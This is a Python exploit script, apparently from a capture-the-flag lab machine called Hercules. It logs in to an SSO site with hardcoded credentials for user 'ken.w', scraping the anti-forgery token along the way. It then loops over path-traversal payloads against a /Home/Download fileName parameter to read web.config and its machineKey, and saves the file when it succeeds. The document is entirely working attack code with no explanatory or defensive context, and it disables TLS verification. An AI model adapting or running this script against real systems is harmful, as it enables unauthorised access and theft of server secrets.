#!/usr/bin/env python3
"""Log in to Hercules SSO as ken.w, then pull web.config via the Download LFI."""
import re

import requests
import urllib3

urllib3.disable_warnings()
BASE = "https://10.129.242.196"
S = requests.Session()
S.verify = False

r = S.get(f"{BASE}/Login", timeout=15)
tok = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text).group(1)

r = S.post(f"{BASE}/Login", data={
    "Username": "ken.w",
    "Password": "change*th1s_p@ssw()rd!!",
    "RememberMe": "true",
    "__RequestVerificationToken": tok,
}, timeout=20, allow_redirects=False)

print(f"login status: {r.status_code}")
print(f"redirect: {r.headers.get('Location')}")
print(f"cookies: { {c.name: c.value[:40] + '...' for c in S.cookies} }")

# follow to the landing page to see what an authenticated session looks like
r2 = S.get(f"{BASE}/Home/Index", timeout=15)
print(f"/Home/Index: {r2.status_code} len={len(r2.text)}")

# now the LFI
for path in ["../../web.config", "..\\..\\web.config", "../../bin/HadesWeb.dll",
             "../../../web.config", "..%2f..%2fweb.config"]:
    r3 = S.get(f"{BASE}/Home/Download", params={"fileName": path}, timeout=20)
    body = r3.text
    print(f"\n--- fileName={path} -> {r3.status_code} len={len(body)}")
    if "<configuration" in body or "machineKey" in body:
        print(body[:3000])
        open("/home/kali/hercules/web.config", "w").write(body)
        print("\n[+] saved to web.config")
        break
    else:
        print(body[:200].replace("\n", " "))
